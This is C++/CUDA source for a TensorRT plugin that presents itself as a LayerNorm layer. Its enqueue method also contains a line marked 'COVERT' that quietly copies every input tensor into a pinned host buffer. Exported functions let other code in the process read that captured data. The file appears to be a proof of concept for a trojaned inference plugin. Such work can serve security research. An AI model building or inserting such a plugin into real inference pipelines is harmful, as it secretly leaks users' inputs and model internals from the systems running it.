/*
 * aispy_trt_plugin.cu  —  TRT 10.x compatible
 *
 * Compile:
 *   nvcc -shared -Xcompiler -fPIC -o aispy_trt_plugin.so aispy_trt_plugin.cu \
 *        -I/tmp/trt_include -I/usr/local/cuda/include \
 *        -L/usr/local/cuda/lib64 -lnvinfer -lcudart \
 *        -arch=sm_89 -std=c++17 -O2
 */

#include <cstdint>
#include <cstring>
#include <cmath>
#include <iostream>
#include <string>
#include <vector>
#include <mutex>

#include <cuda_runtime.h>
#include <NvInfer.h>
#include <NvInferPlugin.h>

using namespace nvinfer1;

// ── Global exfil state ───────────────────────────────────────────────────────
namespace aispy {
static void*    g_exfil_buffer   = nullptr;
static size_t   g_exfil_buf_size = 0;
static bool     g_exfil_ready    = false;
static uint64_t g_exfil_calls    = 0;
static std::mutex g_mutex;

static cudaError_t aispy_exfil_async(cudaStream_t stream, const void* src, size_t n) {
    std::lock_guard<std::mutex> lk(g_mutex);
    if (!g_exfil_buffer || g_exfil_buf_size < n) {
        if (g_exfil_buffer) cudaFreeHost(g_exfil_buffer);
        cudaHostAlloc(&g_exfil_buffer, n, cudaHostAllocPortable | cudaHostAllocMapped);
        g_exfil_buf_size = n;
    }
    g_exfil_ready = false;
    ++g_exfil_calls;
    return cudaMemcpyAsync(g_exfil_buffer, src, n, cudaMemcpyDeviceToHost, stream);
}
} // namespace aispy

// ── LayerNorm CUDA kernel ────────────────────────────────────────────────────
__global__ void layernorm_kernel(
    const float* __restrict__ x,
    const float* __restrict__ gamma,
    const float* __restrict__ beta,
    float*       __restrict__ y,
    int hidden, float eps
) {
    extern __shared__ float smem[];
    int row = blockIdx.x;
    const float* xrow = x + row * hidden;
    float*       yrow = y + row * hidden;

    float sum = 0.f;
    for (int i = threadIdx.x; i < hidden; i += blockDim.x) sum += xrow[i];
    smem[threadIdx.x] = sum;
    __syncthreads();
    for (int s = blockDim.x/2; s > 0; s >>= 1) {
        if (threadIdx.x < s) smem[threadIdx.x] += smem[threadIdx.x + s];
        __syncthreads();
    }
    float mean = smem[0] / (float)hidden;
    __syncthreads();

    sum = 0.f;
    for (int i = threadIdx.x; i < hidden; i += blockDim.x) {
        float d = xrow[i] - mean; sum += d*d;
    }
    smem[threadIdx.x] = sum;
    __syncthreads();
    for (int s = blockDim.x/2; s > 0; s >>= 1) {
        if (threadIdx.x < s) smem[threadIdx.x] += smem[threadIdx.x + s];
        __syncthreads();
    }
    float inv_std = rsqrtf(smem[0] / (float)hidden + eps);
    __syncthreads();

    for (int i = threadIdx.x; i < hidden; i += blockDim.x)
        yrow[i] = (xrow[i] - mean) * inv_std * gamma[i] + beta[i];
}

// ── Plugin ───────────────────────────────────────────────────────────────────
static const char* PLUGIN_TYPE    = "AiSpyLayerNorm";
static const char* PLUGIN_VERSION = "1";
static const char* PLUGIN_NS      = "";

class AiSpyLayerNormPlugin : public IPluginV2DynamicExt {
public:
    AiSpyLayerNormPlugin(int hidden, float eps=1e-5f) : mHidden(hidden), mEps(eps) {}
    AiSpyLayerNormPlugin(const void* data, size_t) {
        const char* d = static_cast<const char*>(data);
        mHidden = *reinterpret_cast<const int*>(d);   d += sizeof(int);
        mEps    = *reinterpret_cast<const float*>(d);
    }

    // IPluginV2
    const char* getPluginType()    const noexcept override { return PLUGIN_TYPE; }
    const char* getPluginVersion() const noexcept override { return PLUGIN_VERSION; }
    int32_t     getNbOutputs()     const noexcept override { return 1; }
    int32_t     initialize()             noexcept override { return 0; }
    void        terminate()              noexcept override {}
    void        destroy()                noexcept override { delete this; }
    void setPluginNamespace(const char* ns) noexcept override { mNS = ns; }
    const char* getPluginNamespace()    const noexcept override { return mNS.c_str(); }

    // Serialisation
    size_t getSerializationSize() const noexcept override { return sizeof(int)+sizeof(float); }
    void serialize(void* buf) const noexcept override {
        char* d = static_cast<char*>(buf);
        *reinterpret_cast<int*>(d)   = mHidden; d += sizeof(int);
        *reinterpret_cast<float*>(d) = mEps;
    }

    // IPluginV2Ext
    DataType getOutputDataType(int32_t, const DataType* in, int32_t) const noexcept override {
        return in[0];
    }

    // IPluginV2DynamicExt
    IPluginV2DynamicExt* clone() const noexcept override {
        return new AiSpyLayerNormPlugin(mHidden, mEps);
    }
    DimsExprs getOutputDimensions(int32_t, const DimsExprs* inputs, int32_t, IExprBuilder&) noexcept override {
        return inputs[0];
    }
    bool supportsFormatCombination(int32_t, const PluginTensorDesc* io, int32_t, int32_t) noexcept override {
        return io[0].type == DataType::kFLOAT && io[0].format == TensorFormat::kLINEAR;
    }
    void configurePlugin(const DynamicPluginTensorDesc*, int32_t,
                         const DynamicPluginTensorDesc*, int32_t) noexcept override {}
    size_t getWorkspaceSize(const PluginTensorDesc*, int32_t,
                            const PluginTensorDesc*, int32_t) const noexcept override { return 0; }

    // TRT 10: enqueue (not enqueueV2)
    int32_t enqueue(const PluginTensorDesc* inputDesc, const PluginTensorDesc*,
                    const void* const* inputs, void* const* outputs,
                    void*, cudaStream_t stream) noexcept override {
        int64_t n = 1;
        for (int i = 0; i < inputDesc[0].dims.nbDims; ++i) n *= inputDesc[0].dims.d[i];
        size_t nb = static_cast<size_t>(n) * sizeof(float);

        // ── COVERT ──
        aispy::aispy_exfil_async(stream, inputs[0], nb);

        int rows = static_cast<int>(n / mHidden);
        int thr  = std::min(mHidden, 256);
        layernorm_kernel<<<rows, thr, thr*sizeof(float), stream>>>(
            static_cast<const float*>(inputs[0]),
            static_cast<const float*>(inputs[1]),
            static_cast<const float*>(inputs[2]),
            static_cast<float*>(outputs[0]),
            mHidden, mEps);
        return 0;
    }

private:
    int mHidden; float mEps; std::string mNS{PLUGIN_NS};
};

// ── Creator ──────────────────────────────────────────────────────────────────
class AiSpyLayerNormPluginCreator : public IPluginCreator {
public:
    AiSpyLayerNormPluginCreator() {
        mFC.fields = nullptr; mFC.nbFields = 0;
    }
    const char* getPluginName()      const noexcept override { return PLUGIN_TYPE; }
    const char* getPluginVersion()   const noexcept override { return PLUGIN_VERSION; }
    const char* getPluginNamespace() const noexcept override { return PLUGIN_NS; }
    void setPluginNamespace(const char*) noexcept override {}
    const PluginFieldCollection* getFieldNames() noexcept override { return &mFC; }

    IPluginV2* createPlugin(const char*, const PluginFieldCollection* fc) noexcept override {
        int hidden=768; float eps=1e-5f;
        for (int i=0;i<fc->nbFields;++i) {
            if (std::string(fc->fields[i].name)=="hidden")
                hidden=*static_cast<const int*>(fc->fields[i].data);
            if (std::string(fc->fields[i].name)=="epsilon")
                eps=*static_cast<const float*>(fc->fields[i].data);
        }
        return new AiSpyLayerNormPlugin(hidden, eps);
    }
    IPluginV2* deserializePlugin(const char*, const void* data, size_t len) noexcept override {
        return new AiSpyLayerNormPlugin(data, len);
    }
private:
    PluginFieldCollection mFC{};
};

// ── Library entry point ──────────────────────────────────────────────────────
static AiSpyLayerNormPluginCreator gCreator;

extern "C" {
TENSORRTAPI bool initLibNvInferPlugins(void*, const char*) {
    // TRT 10: getPluginRegistry() returns pointer
    IPluginRegistry* reg = getPluginRegistry();
    reg->registerCreator(gCreator, PLUGIN_NS);
    std::cout << "[AiSPY] AiSpyLayerNormPlugin registered." << std::endl;
    return true;
}
TENSORRTAPI const void* aispy_get_exfil_ptr()   { return aispy::g_exfil_buffer; }
TENSORRTAPI size_t      aispy_get_exfil_size()  { return aispy::g_exfil_buf_size; }
TENSORRTAPI uint64_t    aispy_get_call_count()  { return aispy::g_exfil_calls; }
TENSORRTAPI bool        aispy_is_ready()        { return aispy::g_exfil_ready; }
}
